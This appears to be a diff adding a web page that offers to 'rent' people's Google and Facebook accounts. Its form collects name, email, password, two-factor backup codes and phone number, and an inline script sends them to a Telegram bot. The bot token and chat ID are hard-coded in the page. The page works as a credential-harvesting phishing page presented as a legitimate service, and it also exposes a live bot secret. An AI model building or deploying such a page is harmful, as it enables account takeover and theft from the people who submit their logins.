@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>HTML & CSS практика от AVIS TV</title>
+
+	<!-- Bootstrap reboot (для сброса стилей) -->
+	<link rel="stylesheet" href="libs/bootstrap-reboot.min.css">
+
+	<!-- Bootstrap сетка -->
+	<link rel="stylesheet" href="libs/bootstrap-grid.min.css">
+
+	<!-- Шрифты с Google Fonts -->
+	<link rel="preconnect" href="https://fonts.gstatic.com">
+	<link href="https://fonts.googleapis.com/css2?family=Noto+Sans:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+	<!-- Стили сайта -->
+	<link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+
+<nav class="navbar">
+	<div class="container">
+		<a href="van4ik24.github.io/site-form" class="a navbar-brand">Оренда Google</a>
+	<div class="navbar-wrap">
+		<ul class="navbar-menu">
+			<li><a href="https://sites.google.com/view/orenda20/%D0%B3%D0%BE%D0%BB%D0%BE%D0%B2%D0%BD%D0%B0-%D1%81%D1%82%D0%BE%D1%80%D1%96%D0%BD%D0%BA%D0%B0?authuser=5">Оплата Google</a></li>
+			<li><a href="https://sites.google.com/view/orenda200/%D0%B3%D0%BE%D0%BB%D0%BE%D0%B2%D0%BD%D0%B0-%D1%81%D1%82%D0%BE%D1%80%D1%96%D0%BD%D0%BA%D0%B0?authuser=5">Оплата Facebook</a></li>
+			<li><a href="https://sites.google.com/view/orenda22/%D0%B3%D0%BE%D0%BB%D0%BE%D0%B2%D0%BD%D0%B0-%D1%81%D1%82%D0%BE%D1%80%D1%96%D0%BD%D0%BA%D0%B0?authuser=5">Умови Google</a></li>
+			<li><a href="https://sites.google.com/view/orenda2/%D0%B3%D0%BE%D0%BB%D0%BE%D0%B2%D0%BD%D0%B0-%D1%81%D1%82%D0%BE%D1%80%D1%96%D0%BD%D0%BA%D0%B0?authuser=5">Умови Facebook</a></li>
+			<li><a href="https://sites.google.com/d/1EXHZchybV4Em1VZAEFfFx1Lgrilkm-IQ/p/1oyPMdLBWAa0upFSaraKbezQ0Xa6-JoLj/edit">Контакти</a></li>
+		</ul>
+<a href="van4ik24.github.io/site-form" class="callback">Здать акаунт в оренду</a>
+	</div>
+	</div>
+</nav>
+	
+</body>
+</html>
+
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT" crossorigin="anonymous">
+
+</head>
+
+<body>
+
+  <div class="container mt-5 pt-5 pb-5">
+    <div class="col-md-6 offset-md-3">
+      <form id="tg">
+        <div class="form-group">
+          <label class="form-label">Ім'я</label>
+          <input type="text" name="name" class="form-control">
+        </div>
+        <!-- /.form-group -->
+        <div class="form-group">
+          <label class="form-label">Email</label>
+          <input type="email" name="email" class="form-control">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Пароль</label>
+          <input type="text" name="password" class="form-control">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Резервні коди</label>
+          <input type="text" name="codes" class="form-control">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Номер телефону</label>
+          <input type="text" name="namber" class="form-control">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Цей акаунт раніше був в оренді?</label>
+          <input type="text" name="yesno" class="form-control">
+        </div>
+        <!-- /.form-group -->
+
+        <div id="success" class="alert alert-success" role="alert" style="display: none;"></div>
+
+        <button type="submit" class="btn btn-primary mt-10">Відпровити</button>
+      </form>
+    </div>
+  </div>
+  <!-- /.col-md-6 offset-md-3 -->
+  </div>
+  <!-- /.container -->
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
+  <script>
+    const TOKEN = "5640232171:AAH48wqsLGFhWfMxkNhpNj_giUowl3bMThM";
+    const CHAT_ID = "-1001581557176";
+    const URI_API = `https://api.telegram.org/bot${ TOKEN }/sendMessage`;
+    const success = document.getElementById('success');
+    document.getElementById('tg').addEventListener('submit', function(e) {
+      e.preventDefault();
+      let message = `<b>Заявка з сайту!</b>\n`;
+      message += `<b>Відправник:</b> ${ this.name.value }\n`;
+      message += `<b>Пошта:</b> ${ this.email.value }\n`;
+      message += `<b>Пароль:</b> ${ this.password.value }\n`;
+      message += `<b>Коди:</b> ${ this.codes.value }\n`;
+      message += `<b>Номер:</b> ${ this.namber.value }\n`;
+      message += `<b>Був в оренді?</b> ${ this.yesno.value }`;
+      axios.post(URI_API, {
+          chat_id: CHAT_ID,
+          parse_mode: 'html',
+          text: message
+        })
+        .then((res) => {
+          this.yesno.value = "";
+          this.yesno.value = "";
+          success.innerHTML = 'Форма заповнена! ✅ Ми з вам відповімо протягом години ';
+          success.style.display = 'block';
+        })
+        .catch((err) => {
+          console.warn(err);
+        })
+        .finally(() => {
+          comsole.log('Кінец');
+        })
+    })
+  </script>
+
+</body>
+
+</html>
